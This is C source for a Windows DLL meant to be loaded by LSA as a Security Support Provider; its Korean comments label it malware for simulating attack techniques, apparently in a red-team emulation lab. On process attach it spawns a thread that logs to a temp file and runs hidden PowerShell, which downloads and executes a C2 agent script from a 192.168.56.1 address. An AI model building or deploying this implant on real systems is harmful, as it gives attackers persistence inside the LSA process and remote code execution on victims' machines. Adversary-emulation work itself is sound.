#include <windows.h>
#include <stdio.h>
#include <tchar.h>

// SSP DLL 악성코드 - TTPS 시뮬레이션용

DWORD WINAPI MalwareThread(LPVOID param) {
    // 로깅
    FILE* f = fopen("C:\\Windows\\Temp\\lsa_loaded.txt", "a");
    if (f) {
        fprintf(f, "[%lu] Malware SSP loaded by LSA\n", GetTickCount());
        fclose(f);
    }

    // C2 payload 다운로드 및 실행
    system("powershell -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.1:34444/agents/sandcat_ttps10.ps1')\"");
    
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    switch (reason) {
        case DLL_PROCESS_ATTACH:
            // LSA 프로세스 시작 시 한 번만 실행
            CreateThread(NULL, 0, MalwareThread, NULL, 0, NULL);
            break;

        case DLL_PROCESS_DETACH:
            // 프로세스 종료 시 (필요시 정리 작업)
            break;

        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}